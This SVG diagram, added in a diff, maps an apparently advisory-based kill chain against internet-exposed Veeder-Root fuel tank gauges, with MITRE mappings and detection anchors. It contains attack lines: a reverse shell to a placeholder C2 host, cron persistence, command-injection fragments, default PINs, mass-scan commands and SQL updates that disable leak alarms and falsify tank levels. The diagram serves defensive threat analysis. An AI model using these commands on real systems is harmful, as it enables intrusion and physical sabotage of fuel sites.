@@ -1,0 +1,273 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 880 1280" role="img" aria-labelledby="t d">
+  <title id="t">Iran-nexus ATG Cyber-Physical Kill Chain</title>
+  <desc id="d">Two-lane kill chain. Left lane shows victim-side stages: internet-exposed ATG devices scanned on port 10001/tcp, authentication bypassed via hardcoded credentials, OS command injection achieves shell, privilege escalation to root, alarm suppression removes leak detection, tank readings manipulated. Right lane shows attacker operations: scanning infrastructure enumerates exposed ATGs, exploit toolkit deployed, authenticated management session opened, shell persistence established, physical-consequence configuration pushed, operational fuel intelligence collected. Critical badges mark alarm suppression and reading manipulation as physical-consequence steps. Detection anchors include port 10001 inbound firewall rules, ATG web management OS command patterns, and outbound connection anomalies from OT subnet.</desc>
+  <defs>
+<style><![CDATA[
+.bg { fill: #ffffff; }
+.head { font: 700 18px sans-serif; fill: #0a0a0a; }
+.meta { font: 11px sans-serif; fill: #404040; }
+.laneL { fill: #f3f7fb; stroke: #5a7da6; stroke-width: 1.2; }
+.laneR { fill: #faf3ee; stroke: #b07a3a; stroke-width: 1.2; }
+.laneLabelL { font: 700 12px sans-serif; fill: #2a4a6a; }
+.laneLabelR { font: 700 12px sans-serif; fill: #8a5520; }
+.stage { fill: #ffffff; stroke: #5a7da6; stroke-width: 1.1; }
+.stageK { fill: #fdecec; stroke: #b03030; stroke-width: 1.4; }
+.op { fill: #ffffff; stroke: #b07a3a; stroke-width: 1.1; }
+.opK { fill: #fdecec; stroke: #b03030; stroke-width: 1.4; }
+.band { fill: #f7f1eb; stroke: #c08555; stroke-width: 1.2; }
+.badge { fill: #5a7da6; }
+.badgeK { fill: #b03030; }
+.badgeR { fill: #b07a3a; }
+.badgeText { font: 700 12px sans-serif; fill: #ffffff; text-anchor: middle; }
+.label { font: 700 13px sans-serif; fill: #0a0a0a; }
+.sub { font: 11px sans-serif; fill: #303030; }
+.mono { font: 10.5px ui-monospace, "SFMono-Regular", Consolas, monospace; fill: #303030; }
+.footer { fill: #f6f6f4; stroke: #888; stroke-width: 1; }
+.footerH { font: 700 12px sans-serif; fill: #1a1a1a; }
+.footerT { font: 10.5px sans-serif; fill: #1a1a1a; }
+.arrow { stroke: #2a4a6a; stroke-width: 1.6; fill: none; }
+.arrowX { stroke: #7a3a7a; stroke-width: 1.6; fill: none; stroke-dasharray: 5 3; }
+.arrowR { stroke: #8a5520; stroke-width: 1.6; fill: none; }
+
+@media (prefers-color-scheme: dark) {
+  .bg { fill: #0d1117; }
+  .head, .label, .footerH { fill: #f0f0f0; }
+  .meta, .sub, .footerT { fill: #c8c8c8; }
+  .mono { fill: #c0d0e0; }
+  .laneL { fill: #182230; stroke: #7aa6d0; }
+  .laneR { fill: #2a2418; stroke: #d09a5a; }
+  .laneLabelL { fill: #a8c6e2; }
+  .laneLabelR { fill: #e2bf8a; }
+  .stage { fill: #1c2530; stroke: #7aa6d0; }
+  .stageK { fill: #3a1818; stroke: #e06060; }
+  .op { fill: #2a2418; stroke: #d09a5a; }
+  .opK { fill: #3a1818; stroke: #e06060; }
+  .band { fill: #2a2418; stroke: #d09a5a; }
+  .badge { fill: #7aa6d0; }
+  .badgeK { fill: #e06060; }
+  .badgeR { fill: #d09a5a; }
+  .badgeText { fill: #0d1117; }
+  .footer { fill: #1a1d22; stroke: #555; }
+  .arrow { stroke: #a8c6e2; }
+  .arrowX { stroke: #c898d0; }
+  .arrowR { stroke: #e2bf8a; }
+}
+
+.acc-ransomware { fill: #b03030; }
+.acc-espionage { fill: #2a4a6a; }
+.acc-supply-chain { fill: #b07a3a; }
+.acc-identity-cloud { fill: #6a4ca6; }
+.acc-ot-ics { fill: #2f8f4e; }
+.acc-edge-network { fill: #1d7a8c; }
+.acc-mobile { fill: #c2569a; }
+.acc-crypto-defi { fill: #d08a1f; }
+.acc-malware-re { fill: #556070; }
+.acc-other { fill: #6a6a6a; }
+.accLabel { font: 700 11px sans-serif; fill: #ffffff; }
+]]></style>
+<marker id="ah" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
+  <path d="M0,0 L10,5 L0,10 z" fill="currentColor"/>
+</marker>
+  </defs>
+
+  <!-- Background -->
+  <rect class="bg" x="0" y="0" width="880" height="1280"/>
+  <rect class="acc-ot-ics" x="0" y="0" width="880" height="8"/>
+
+  <!-- Header -->
+  <text class="head" x="20" y="36">Iran-Nexus ATG Cyber-Physical Campaign</text>
+  <text class="meta" x="20" y="58">Vendor: CISA/FBI/NSA/DoE · Date: 2026-06-02 · Cluster: Iran-nexus (unattributed) · Day 53</text>
+
+  <!-- Left lane: Victim / ATG device side -->
+  <rect class="laneL" x="20" y="85" width="410" height="1080"/>
+  <text class="laneLabelL" x="215" y="104" text-anchor="middle">VICTIM — ATG Device / Fuel Site</text>
+
+  <!-- Right lane: Attacker infrastructure -->
+  <rect class="laneR" x="450" y="85" width="410" height="1080"/>
+  <text class="laneLabelR" x="655" y="104" text-anchor="middle">ATTACKER — Infrastructure / Operations</text>
+
+  <!-- === LEFT STAGES === -->
+
+  <!-- Stage 1: Reconnaissance (y=120) -->
+  <rect class="stage" x="30" y="120" width="395" height="135"/>
+  <circle class="badge" cx="50" cy="140" r="14"/>
+  <text class="badgeText" x="50" y="145">1</text>
+  <text class="label" x="70" y="144">Reconnaissance — Internet Exposure</text>
+  <text class="sub" x="38" y="168">ATG on port 10001/tcp reachable from internet</text>
+  <text class="sub" x="38" y="184">Shodan/Censys scan — 1061+ IPs globally (Shadowserver)</text>
+  <text class="sub" x="38" y="200">T1595.002 Active Scanning: Vulnerability Scanning</text>
+  <text class="mono" x="38" y="226">tcp/10001 — Veeder-Root TLS management</text>
+  <text class="mono" x="38" y="244">nmap -p 10001 --open &lt;OT_CIDR&gt;</text>
+
+  <!-- Stage 2: Initial Access (y=270) -->
+  <rect class="stage" x="30" y="270" width="395" height="135"/>
+  <circle class="badge" cx="50" cy="290" r="14"/>
+  <text class="badgeText" x="50" y="295">2</text>
+  <text class="label" x="70" y="294">Initial Access — Auth Bypass / Hardcoded Creds</text>
+  <text class="sub" x="38" y="318">Auth bypass flaw in TLS management protocol</text>
+  <text class="sub" x="38" y="334">Default 8-zero PIN (00000000) — no credential rotation</text>
+  <text class="sub" x="38" y="350">T1190 Exploit Public-Facing App | T1078 Valid Accounts</text>
+  <text class="mono" x="38" y="376">CVE-2025-58428 CVSS 9.4 (TLS4B)</text>
+  <text class="mono" x="38" y="394">Hardcoded ALLOW:*.*.*.* in firmware ACL</text>
+
+  <!-- Stage 3: Execution (y=420) -->
+  <rect class="stage" x="30" y="420" width="395" height="135"/>
+  <circle class="badge" cx="50" cy="440" r="14"/>
+  <text class="badgeText" x="50" y="445">3</text>
+  <text class="label" x="70" y="444">Execution — OS Command + SQL Injection</text>
+  <text class="sub" x="38" y="468">OS command injection via ATG web management CGI</text>
+  <text class="sub" x="38" y="484">SQL injection into ATG configuration database</text>
+  <text class="sub" x="38" y="500">T1059.004 Unix Shell | T1190</text>
+  <text class="mono" x="38" y="526">;id; whoami /etc/passwd cat</text>
+  <text class="mono" x="38" y="544">UNION SELECT / OR 1=1 / DROP TABLE</text>
+
+  <!-- Stage 4: Privilege Escalation (y=570) -->
+  <rect class="stage" x="30" y="570" width="395" height="135"/>
+  <circle class="badge" cx="50" cy="590" r="14"/>
+  <text class="badgeText" x="50" y="595">4</text>
+  <text class="label" x="70" y="594">Privilege Escalation — Root on ATG Linux OS</text>
+  <text class="sub" x="38" y="618">Escalate from web-app context to full OS root</text>
+  <text class="sub" x="38" y="634">Full administrator on device application layer</text>
+  <text class="sub" x="38" y="650">T1068 Exploitation for Privilege Escalation</text>
+  <text class="mono" x="38" y="676">id -&gt; uid=0(root) confirmed</text>
+  <text class="mono" x="38" y="694">useradd / passwd / crontab -e for persistence</text>
+
+  <!-- Stage 5: Alert Suppression (y=720) — CRITICAL -->
+  <rect class="stageK" x="30" y="720" width="395" height="135"/>
+  <circle class="badgeK" cx="50" cy="740" r="14"/>
+  <text class="badgeText" x="50" y="745">5</text>
+  <text class="label" x="38" y="744">IMPACT — Alarm Suppression (Physical Consequence)</text>
+  <text class="sub" x="38" y="768">Disable leak detection alerts on ATG console</text>
+  <text class="sub" x="38" y="784">Set alarm thresholds to unreachable values</text>
+  <text class="sub" x="38" y="800">T1562.001 Disable Tools | T0816 Device Stop | T0831</text>
+  <text class="mono" x="38" y="826">ALARM_DISABLED: LEAK_DETECT — real leak undetected</text>
+  <text class="mono" x="38" y="844">Fire/explosion risk | EPA reporting triggered</text>
+
+  <!-- Stage 6: Reading Manipulation (y=870) — CRITICAL -->
+  <rect class="stageK" x="30" y="870" width="395" height="135"/>
+  <circle class="badgeK" cx="50" cy="890" r="14"/>
+  <text class="badgeText" x="50" y="895">6</text>
+  <text class="label" x="38" y="894">IMPACT — Tank Reading Manipulation</text>
+  <text class="sub" x="38" y="918">Modify fuel level / temperature readings in DB</text>
+  <text class="sub" x="38" y="934">Operator trusts false readings; incorrect delivery ops</text>
+  <text class="sub" x="38" y="950">T1565.001 Stored Data Manipulation | T0836 Modify Param</text>
+  <text class="mono" x="38" y="976">SQL UPDATE tbl_tank SET level=999 WHERE id=1</text>
+  <text class="mono" x="38" y="994">Dip-stick delta &gt;1% vs. display = confirmed tamper</text>
+
+  <!-- Stage 7: Exfiltration (y=1020) -->
+  <rect class="stage" x="30" y="1020" width="395" height="135"/>
+  <circle class="badgeR" cx="50" cy="1040" r="14"/>
+  <text class="badgeText" x="50" y="1045">7</text>
+  <text class="label" x="70" y="1044">Collection / Exfil — Operational Fuel Intel</text>
+  <text class="sub" x="38" y="1068">Collect fuel inventory, delivery schedules, site layout</text>
+  <text class="sub" x="38" y="1084">Outbound TCP from OT subnet — C2 or exfil</text>
+  <text class="sub" x="38" y="1100">T1041 Exfil over C2 | T1071.001</text>
+  <text class="mono" x="38" y="1126">OT host initiating outbound EXTERNAL_NET TCP</text>
+  <text class="mono" x="38" y="1144">curl/wget from ATG device = confirmed compromise</text>
+
+  <!-- === RIGHT ATTACKER OPERATIONS === -->
+
+  <!-- Op 1: Scanning (y=125) -->
+  <rect class="op" x="460" y="125" width="395" height="155"/>
+  <circle class="badgeR" cx="480" cy="145" r="14"/>
+  <text class="badgeText" x="480" y="150">A</text>
+  <text class="label" x="500" y="149">Scanning — Identify Exposed ATGs</text>
+  <text class="sub" x="468" y="173">Shodan/Censys queries: port:10001 product:Veeder-Root</text>
+  <text class="sub" x="468" y="189">Mass scan of port 10001/tcp across internet</text>
+  <text class="sub" x="468" y="205">Filter for no-auth / default-cred targets</text>
+  <text class="sub" x="468" y="221">Shadowserver: 1061+ hits globally 2026-06-05</text>
+  <text class="mono" x="468" y="247">shodan search "port:10001 Veeder-Root"</text>
+  <text class="mono" x="468" y="265">zmap -p 10001 0.0.0.0/0 — mass scan</text>
+
+  <!-- Op 2: Weaponization (y=295) -->
+  <rect class="op" x="460" y="295" width="395" height="155"/>
+  <circle class="badgeR" cx="480" cy="315" r="14"/>
+  <text class="badgeText" x="480" y="320">B</text>
+  <text class="label" x="500" y="319">Toolkit — ATG Exploit Framework</text>
+  <text class="sub" x="468" y="343">TLS protocol client with auth bypass module</text>
+  <text class="sub" x="468" y="359">CVE-2025-58428 OS command injection PoC</text>
+  <text class="sub" x="468" y="375">Default credential spray (00000000 / 12345678)</text>
+  <text class="sub" x="468" y="391">SQL injection payloads for ATG config DB</text>
+  <text class="mono" x="468" y="417">No public sample; YARA rules are heuristic only</text>
+  <text class="mono" x="468" y="435">Toolkit confirmed by CISA advisory IC3-260602</text>
+
+  <!-- Op 3: Access (y=465) -->
+  <rect class="op" x="460" y="465" width="395" height="155"/>
+  <circle class="badgeR" cx="480" cy="485" r="14"/>
+  <text class="badgeText" x="480" y="490">C</text>
+  <text class="label" x="500" y="489">Access — ATG Management Session</text>
+  <text class="sub" x="468" y="513">Open TLS management session on port 10001/tcp</text>
+  <text class="sub" x="468" y="529">Authenticate with bypass or default credential</text>
+  <text class="sub" x="468" y="545">Enumerate tank inventory and alarm configuration</text>
+  <text class="sub" x="468" y="561">Map site layout for targeting</text>
+  <text class="mono" x="468" y="587">nc &lt;ATG_IP&gt; 10001 — raw TLS session</text>
+  <text class="mono" x="468" y="605">Function code i10100 — in-tank inventory dump</text>
+
+  <!-- Op 4: Shell Persistence (y=635) -->
+  <rect class="op" x="460" y="635" width="395" height="155"/>
+  <circle class="badgeR" cx="480" cy="655" r="14"/>
+  <text class="badgeText" x="480" y="660">D</text>
+  <text class="label" x="500" y="659">Persistence — Shell on ATG Linux OS</text>
+  <text class="sub" x="468" y="683">OS command injection achieves shell via web CGI</text>
+  <text class="sub" x="468" y="699">Escalate to root; add backdoor user</text>
+  <text class="sub" x="468" y="715">Cron job for persistence across ATG reboots</text>
+  <text class="sub" x="468" y="731">Reverse shell to attacker C2 infrastructure</text>
+  <text class="mono" x="468" y="757">bash -i &gt;&amp; /dev/tcp/&lt;C2&gt;/4444 0&gt;&amp;1</text>
+  <text class="mono" x="468" y="775">*/5 * * * * root /tmp/.atg_agent &gt;/dev/null</text>
+
+  <!-- Op 5: Physical Config (y=805) — CRITICAL -->
+  <rect class="opK" x="460" y="805" width="395" height="155"/>
+  <circle class="badgeK" cx="480" cy="825" r="14"/>
+  <text class="badgeText" x="480" y="830">E</text>
+  <text class="label" x="500" y="829">IMPACT — Push Physical-Consequence Config</text>
+  <text class="sub" x="468" y="853">Disable leak detection alarm thresholds</text>
+  <text class="sub" x="468" y="869">Modify tank level readings in ATG database</text>
+  <text class="sub" x="468" y="885">Delete or modify local audit log to cover tracks</text>
+  <text class="sub" x="468" y="901">Attacker removes visibility into physical process</text>
+  <text class="mono" x="468" y="927">UPDATE alarm SET enabled=0 WHERE type='LEAK'</text>
+  <text class="mono" x="468" y="945">UPDATE tank SET level=9999 WHERE site_id=1</text>
+
+  <!-- Op 6: Intel Collection (y=975) -->
+  <rect class="op" x="460" y="975" width="395" height="155"/>
+  <circle class="badgeR" cx="480" cy="995" r="14"/>
+  <text class="badgeText" x="480" y="1000">F</text>
+  <text class="label" x="500" y="999">Collection — Fuel / Site Intelligence</text>
+  <text class="sub" x="468" y="1023">Exfiltrate fuel inventory and delivery schedules</text>
+  <text class="sub" x="468" y="1039">Map fuel infrastructure for strategic targeting</text>
+  <text class="sub" x="468" y="1055">Sectors: Energy / Chemical / Food / Transport</text>
+  <text class="sub" x="468" y="1071">Data used for sabotage planning or ransom leverage</text>
+  <text class="mono" x="468" y="1097">OT device outbound TCP -&gt; external = C2/exfil</text>
+  <text class="mono" x="468" y="1115">Suricata SID 2400005 fires on ATG outbound</text>
+
+  <!-- === ARROWS === -->
+  <!-- Left lane vertical flow -->
+  <line class="arrow" x1="227" y1="255" x2="227" y2="270" marker-end="url(#ah)"/>
+  <line class="arrow" x1="227" y1="405" x2="227" y2="420" marker-end="url(#ah)"/>
+  <line class="arrow" x1="227" y1="555" x2="227" y2="570" marker-end="url(#ah)"/>
+  <line class="arrow" x1="227" y1="705" x2="227" y2="720" marker-end="url(#ah)"/>
+  <line class="arrow" x1="227" y1="855" x2="227" y2="870" marker-end="url(#ah)"/>
+  <line class="arrow" x1="227" y1="1005" x2="227" y2="1020" marker-end="url(#ah)"/>
+
+  <!-- Right lane vertical flow -->
+  <line class="arrowR" x1="657" y1="280" x2="657" y2="295" marker-end="url(#ah)"/>
+  <line class="arrowR" x1="657" y1="450" x2="657" y2="465" marker-end="url(#ah)"/>
+  <line class="arrowR" x1="657" y1="620" x2="657" y2="635" marker-end="url(#ah)"/>
+  <line class="arrowR" x1="657" y1="790" x2="657" y2="805" marker-end="url(#ah)"/>
+  <line class="arrowR" x1="657" y1="960" x2="657" y2="975" marker-end="url(#ah)"/>
+
+  <!-- Cross-lane arrows -->
+  <!-- Scan finds target -> Stage 1 exposed ATG -->
+  <line class="arrowX" x1="460" y1="197" x2="425" y2="197" marker-end="url(#ah)"/>
+  <!-- Auth bypass toolkit -> Stage 2 initial access -->
+  <line class="arrowX" x1="460" y1="372" x2="425" y2="372" marker-end="url(#ah)"/>
+  <!-- Physical config push -> Stage 5 alarm suppression -->
+  <line class="arrowX" x1="460" y1="882" x2="425" y2="882" marker-end="url(#ah)"/>
+
+  <!-- Footer -->
+  <rect class="footer" x="20" y="1175" width="840" height="95"/>
+  <text class="footerH" x="35" y="1197">MITRE ATT&amp;CK Enterprise</text>
+  <text class="footerT" x="35" y="1213">T1595.002 T1190 T1078 T1059.004 T1068 T1562.001 T1565.001 T1041 T1071.001</text>
+  <text class="footerH" x="35" y="1233">MITRE ATT&amp;CK ICS</text>
+  <text class="footerT" x="35" y="1249">T0836 Modify Parameter T0831 Manipulation of Control T0816 Device Stop T0859 Valid Accounts</text>
+  <text class="footerT" x="35" y="1261">Detection: Suricata SID 2400001-2400005 | Sigma: port-10001, OS-cmdinj, OT-outbound | KQL: atg-kql-001/002/003</text>
+</svg>
